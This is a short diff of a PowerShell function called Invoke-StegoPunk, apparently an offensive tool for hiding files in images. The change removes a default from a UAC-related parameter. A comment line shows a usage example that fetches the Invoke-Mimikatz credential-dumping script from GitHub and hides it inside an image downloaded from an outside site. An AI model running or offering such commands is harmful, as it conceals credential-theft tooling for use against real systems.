@@ -11,7 +11,7 @@ function Invoke-StegoPunk {
             [string]$ImageUrl,
             [string]$ImageName = "$null",
             [ValidateSet(“on”,”off”)]
-            [string]$b_UAC = "on"
+            [string]$b_UAC
             
           )  
 #invoke-stegopunk -mode encryption -fileurl 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1' -imageurl 'http://www.holidayguru.it/wp-content/uploads/2015/10/polignano_puglia.png' -imagename 'mix.png'                  
